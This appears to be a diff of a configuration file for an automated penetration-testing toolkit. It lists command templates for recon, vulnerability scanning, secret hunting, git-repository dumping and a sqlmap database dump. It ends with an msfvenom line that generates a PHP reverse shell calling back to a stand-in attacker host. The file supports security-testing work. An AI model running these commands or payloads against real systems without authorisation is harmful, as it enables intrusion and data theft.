@@ -2,68 +2,89 @@
   "Automated Subdomain Enumeration": [
     "subfinder -d {target} -o {output}/subdomains/subfinder.txt",
     "amass enum -passive -d {target} -o {output}/subdomains/amass.txt",
-    "assetfinder --subs-only {target} > {output}/subdomains/assetfinder.txt"
+    "assetfinder --subs-only {target} > {output}/subdomains/assetfinder.txt",
+    "findomain -t {target} -u {output}/subdomains/findomain.txt",
+    "cat {output}/subdomains/subfinder.txt | dnsx -silent -o {output}/subdomains/dnsx.txt"
   ],
   "Automated Port Scanning": [
     "masscan -p1-65535 --rate=1000 -oG {output}/ports/masscan.txt {target}",
-    "nmap -p- -sV -T4 -oN {output}/ports/nmap_results.txt {target}"
+    "nmap -p- -sV -T4 -oN {output}/ports/nmap_results.txt {target}",
+    "cat {output}/ports/masscan.txt | grep -oE '[0-9]+' | sort -u | tr '\n' ',' | sed 's/,$//' > {output}/ports/ports.txt",
+    "nmap -p$(cat {output}/ports/ports.txt) -sV -T4 -oN {output}/ports/nmap_top_ports.txt {target}"
   ],
   "Automating Screenshot Capture": [
     "eyewitness -f {output}/subdomains/subfinder.txt -d {output}/screenshots/",
-    "cat {output}/subdomains/subfinder.txt | aquatone -out {output}/screenshots/aquatone_output"
+    "cat {output}/subdomains/subfinder.txt | aquatone -out {output}/screenshots/aquatone_output",
+    "gowitness file -f {output}/subdomains/subfinder.txt -P {output}/screenshots/gowitness/"
   ],
   "Automated Directory Brute Forcing": [
     "ffuf -w {wordlist} -u http://{target}/FUZZ",
-    "gobuster dir -u http://{target} -w {wordlist}"
+    "gobuster dir -u http://{target} -w {wordlist}",
+    "ffuf -w {wordlist} -u https://{target}/FUZZ",
+    "gobuster dir -u https://{target} -w {wordlist}"
   ],
   "Automated JavaScript Analysis": [
     "linkfinder -i {output}/urls.txt -o {output}/js/output.txt",
-    "gf apikey < {output}/js/javascript_files.txt > {output}/js/gf_apikey.txt"
+    "gf apikey < {output}/js/javascript_files.txt > {output}/js/gf_apikey.txt",
+    "python3 jsfinder.py -i {output}/js/javascript_files.txt -o {output}/js/jsfinder.txt",
+    "python3 SecretFinder.py -i {output}/js/javascript_files.txt -o {output}/js/secretfinder.txt"
   ],
   "Automated Parameter Discovery": [
     "python3 pamspider.py -u https://{target} -w {wordlist}",
-    "arjun -u https://{target}/api -w {wordlist} -o {output}/arjun_output.txt"
+    "arjun -u https://{target}/api -w {wordlist} -o {output}/arjun_output.txt",
+    "python3 paramspider.py --domain {target} --output {output}/paramspider.txt"
   ],
   "Automated XSS Detection": [
     "dlox -u https://{target}",
-    "xsstrike -u https://{target}"
+    "xsstrike -u https://{target}",
+    "dalfox url https://{target} --output {output}/dalfox.txt",
+    "cat {output}/js/javascript_files.txt | kxss > {output}/js/kxss.txt"
   ],
   "Automated SQL Injection Testing": [
     "sqlmap -u \"http://{target}/page?id=1\" --batch --dbs"
   ],
   "Automated SSRF Discovery": [
     "gopherus generate-payloads",
-    "interactsh-client -v"
+    "interactsh-client -v",
+    "python3 ssrfmap.py -l {output}/urls.txt -p ssrf_payloads.txt -o {output}/ssrfmap.txt"
   ],
   "Automated LFI and RFI Detection": [
     "lfi-suite -u http://{target}",
-    "fimap -u http://{target}"
+    "fimap -u http://{target}",
+    "python3 liffy.py -u http://{target} -w {wordlist} -o {output}/liffy.txt"
   ],
   "Automated Open Redirect Detection": [
-    "oralizer -l {output}/urls.txt -p payloads.txt"
+    "oralizer -l {output}/urls.txt -p payloads.txt",
+    "ffuf -w payloads.txt -u 'http://{target}/redirect?url=FUZZ' -mc 301,302,307,308 -o {output}/openredirect_ffuf.txt"
   ],
   "Automated Security Headers Check": [
     "nikto -h http://{target}",
-    "httpx -u http://{target} -sc -title -server -o {output}/headers.txt"
+    "httpx -u http://{target} -sc -title -server -o {output}/headers.txt",
+    "testssl.sh http://{target} > {output}/testssl.txt"
   ],
   "Automated API Recon": [
-    "kiterunner -u https://{target}/api -w {wordlist}"
+    "kiterunner -u https://{target}/api -w {wordlist}",
+    "apkleaks -f {target}.apk -o {output}/apkleaks.txt"
   ],
   "Automated Content Discovery": [
     "jhaddix -d {target} -o {output}/urls.txt",
-    "waybackurls {target} > {output}/wayback_urls.txt"
+    "waybackurls {target} > {output}/wayback_urls.txt",
+    "gau {target} > {output}/gau_urls.txt"
   ],
   "Automated S3 Bucket Enumeration": [
-    "awsbucketdump -t {target}"
+    "awsbucketdump -t {target}",
+    "s3scanner scan -b {target} -o {output}/s3scanner.txt"
   ],
   "Automated CMS Enumeration": [
-    "cmseek -u http://{target}"
+    "cmseek -u http://{target}",
+    "wpscan --url http://{target} --enumerate u --output {output}/wpscan.txt"
   ],
   "Automated WAF Detection": [
     "wafw00f http://{target}"
   ],
   "Automated Information Disclosure Detection": [
-    "gitdumper http://{target}/.git/ {output}/gitdump/"
+    "gitdumper http://{target}/.git/ {output}/gitdump/",
+    "bash gittools/extractor.sh http://{target}/.git/ {output}/gittools/"
   ],
   "Automated Reverse Shell Generation": [
     "msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > {output}/shell.php"
